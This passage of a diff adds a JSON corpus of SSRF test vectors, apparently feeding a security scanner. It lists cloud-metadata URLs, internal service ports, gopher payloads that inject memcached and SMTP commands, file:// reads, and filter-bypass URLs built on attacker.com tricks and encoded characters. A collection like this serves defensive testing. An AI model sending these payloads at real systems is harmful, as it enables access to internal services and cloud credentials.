+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.6af2107d00",
+      "vector": "http://10.0.0.1:22",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.6cc4e2b984",
+      "vector": "http://0177.0.0.1",
+      "description": "Imported from the legacy corpus (ip_obfuscation).",
+      "context": "ip_obfuscation",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.6e6571d6da",
+      "vector": "http://172.16.0.0/12",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.6ea874dc6d",
+      "vector": "http://127.0.0.1:22",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.72fdf05c0a",
+      "vector": "http://169.254.169.254?@attacker.com",
+      "description": "Imported from the legacy corpus (cloud_metadata).",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "ssrf.legacy.7de401a9e4",
+      "vector": "http://localtest.me",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.7f6cca58f1",
+      "vector": "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
+      "description": "Imported from the legacy corpus (cloud_metadata).",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "ssrf.legacy.82a80fdb3c",
+      "vector": "http://169.254.169.254%00@attacker.com",
+      "description": "Imported from the legacy corpus (cloud_metadata).",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "ssrf.legacy.8495a102e9",
+      "vector": "gopher://localhost:27017/_",
+      "description": "Imported from the legacy corpus (alt_scheme).",
+      "context": "alt_scheme",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.84efaf3999",
+      "vector": "http://192.168.0.1",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.8523ab8065",
+      "vector": "http://localhost",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.86348c6dfe",
+      "vector": "http://[0:0:0:0:0:ffff:127.0.0.1]",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.8a13b89595",
+      "vector": "169.254.169.254",
+      "description": "Imported from the legacy corpus (cloud_metadata).",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "ssrf.legacy.8e1ce94f68",
+      "vector": "http://localhost:9000",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.9261037c50",
+      "vector": "http://[::ffff:127.0.0.1]",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.936807bdbc",
+      "vector": "http://127.0.0.1:80",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.94640e5c11",
+      "vector": "http://172.16.0.1",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.94981cc94e",
+      "vector": "http://attacker.com%2f@localhost",
+      "description": "Imported from the legacy corpus (ip_obfuscation).",
+      "context": "ip_obfuscation",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.95880187da",
+      "vector": "http://192.168.1.1",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.973503d55a",
+      "vector": "http://localhost:8080",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.999881b1cc",
+      "vector": "gopher://127.0.0.1:25/xHELO%20localhost",
+      "description": "Imported from the legacy corpus (alt_scheme).",
+      "context": "alt_scheme",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.99c9387e72",
+      "vector": "http://169.254.169.254@attacker.com",
+      "description": "Imported from the legacy corpus (cloud_metadata).",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "ssrf.legacy.9e86a00514",
+      "vector": "http://metadata.google.internal/computeMetadata/v1/",
+      "description": "Imported from the legacy corpus (cloud_metadata).",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "ssrf.legacy.9f4783d06d",
+      "vector": "http://lvh.me:443",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.9f5124bae3",
+      "vector": "http://metadata/computeMetadata/v1/",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.a420eb5795",
+      "vector": "http://attacker.com#@169.254.169.254",
+      "description": "Imported from the legacy corpus (cloud_metadata).",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "ssrf.legacy.a530898f32",
+      "vector": "http://10.0.0.1",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.a60fca5af3",
+      "vector": "http://localhost.attacker.com",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.aba5962664",
+      "vector": "http://localhost:5000",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.b0b60c4eee",
+      "vector": "http://metadata@attacker.com",
+      "description": "Imported from the legacy corpus (ip_obfuscation).",
+      "context": "ip_obfuscation",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.b54d683406",
+      "vector": "http://[::ffff:169.254.169.254]",
+      "description": "Imported from the legacy corpus (cloud_metadata).",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "ssrf.legacy.b65de77ac6",
+      "vector": "http://172.16.0.1:445",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.b761701aef",
+      "vector": "http://localhost%252f@attacker.com",
+      "description": "Imported from the legacy corpus (ip_obfuscation).",
+      "context": "ip_obfuscation",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "ssrf.legacy.b76ba1e1ea",
+      "vector": "http://192.168.0.1:8080",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.ba6348e570",
+      "vector": "http://attacker.com@169.254.169.254",
+      "description": "Imported from the legacy corpus (cloud_metadata).",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "ssrf.legacy.bd632af879",
+      "vector": "http://017700000001",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.bf5fbb89ce",
+      "vector": "http://169.254.169.254/metadata/v1/",
+      "description": "Imported from the legacy corpus (cloud_metadata).",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "ssrf.legacy.c12b3973d6",
+      "vector": "http://localhost%00.attacker.com",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.c1a1456071",
+      "vector": "http://127.0.0.1:443",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.c84ab5ba49",
+      "vector": "http://169.254.1.1",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.c92ae6e9f6",
+      "vector": "http://127.0.0.1:11211",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.c9d59466b8",
+      "vector": "http://127.0.0.1:27017",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.ccc69dd7ed",
+      "vector": "http://127.0.0.1:6379",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.d4dad0bdd7",
+      "vector": "gopher://127.0.0.1:11211/_%0d%0astats",
+      "description": "Imported from the legacy corpus (alt_scheme).",
+      "context": "alt_scheme",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.d5d4716dec",
+      "vector": "file:///c:/windows/win.ini",
+      "description": "Imported from the legacy corpus (alt_scheme).",
+      "context": "alt_scheme",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.d8373a0728",
+      "vector": "http://127.0.0.1%0A.attacker.com",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.da95a161a4",
+      "vector": "///169.254.169.254",
+      "description": "Imported from the legacy corpus (cloud_metadata).",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "ssrf.legacy.dcea673cad",
+      "vector": "file:///dev/null",
+      "description": "Imported from the legacy corpus (alt_scheme).",
+      "context": "alt_scheme",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.df7540ca53",
+      "vector": "http://0x7f.0x0.0x0.0x1",
+      "description": "Imported from the legacy corpus (ip_obfuscation).",
+      "context": "ip_obfuscation",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "ssrf.legacy.e25cdf617a",
+      "vector": "http://attacker.com\\@localhost",
+      "description": "Imported from the legacy corpus (ip_obfuscation).",
+      "context": "ip_obfuscation",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.e26f0cdcee",
+      "vector": "http://127.0.0.1.attacker.com",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.e487061f46",
+      "vector": "//169.254.169.254",
+      "description": "Imported from the legacy corpus (cloud_metadata).",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "ssrf.legacy.e5609164dd",
+      "vector": "http://192.168.1.1:80",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.e562f69ec3",
+      "vector": "0.0.0.0",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.e6223be3a6",
+      "vector": "http://127.0.0.1.nip.io",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.e934d73f72",
+      "vector": "http://127.0.0.1:3306",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.e94c95d5ca",
+      "vector": "http://metadata.google.internal@attacker.com",
+      "description": "Imported from the legacy corpus (cloud_metadata).",
+      "context": "cloud_metadata",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "ssrf.legacy.eb0bfbb32e",
+      "vector": "file:///dev/random",
+      "description": "Imported from the legacy corpus (alt_scheme).",
+      "context": "alt_scheme",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.ec99323c46",
+      "vector": "file:///dev/urandom",
+      "description": "Imported from the legacy corpus (alt_scheme).",
+      "context": "alt_scheme",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.ed16333fab",
+      "vector": "http://127.1",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.f0313c92b4",
+      "vector": "http://127.0.0.1:8080",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.f3de480c39",
+      "vector": "gopher://localhost:3306/_",
+      "description": "Imported from the legacy corpus (alt_scheme).",
+      "context": "alt_scheme",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.f6c2be7d01",
+      "vector": "http://127.0.0.1:23",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.f789313fdf",
+      "vector": "http://attacker.com@localhost",
+      "description": "Imported from the legacy corpus (ip_obfuscation).",
+      "context": "ip_obfuscation",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.f847fb34eb",
+      "vector": "http://spoofed.burpcollaborator.net",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "oob": true
+    },
+    {
+      "id": "ssrf.legacy.f8c364d338",
+      "vector": "http://127.0.0.1%0D.attacker.com",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssrf.legacy.f9ed68c0a3",
+      "vector": "http://127.0.0.1:9200",
+      "description": "Imported from the legacy corpus (localhost).",
+      "context": "localhost",
+      "cwe": "CWE-918",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    }
+  ]
+}
